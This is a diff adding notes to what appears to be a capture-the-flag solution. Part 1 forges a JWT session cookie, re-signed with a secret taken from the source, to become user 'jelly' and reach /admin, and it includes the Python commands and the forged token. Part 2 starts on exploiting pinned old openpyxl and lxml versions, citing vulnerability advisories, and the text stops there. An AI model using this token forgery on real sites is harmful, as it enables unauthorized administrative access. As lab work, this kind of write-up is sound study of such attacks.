@@ -1,3 +1,14 @@
+part 1
+see jwt token cookie, resign with secret from source to set user to jelly, go to /admin
+```py
+>>> import jwt
+>>> t = jwt.encode({"user":"jelly"}, "secret", algorithm="HS256")
+>>> t
+'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiamVsbHkifQ.12_Iuk4aUvwjnCEIkJi6QlY2MdhuyXXnclyBCWniNDQ'
+>>> 
+```
+
+part 2
 notice weird fixed versions of openpyxl and lxml in Pipfile, find any of 
 https://security.snyk.io/vuln/SNYK-PYTHON-OPENPYXL-40459 ->
 https://www.openwall.com/lists/oss-security/2017/02/07/5 ->
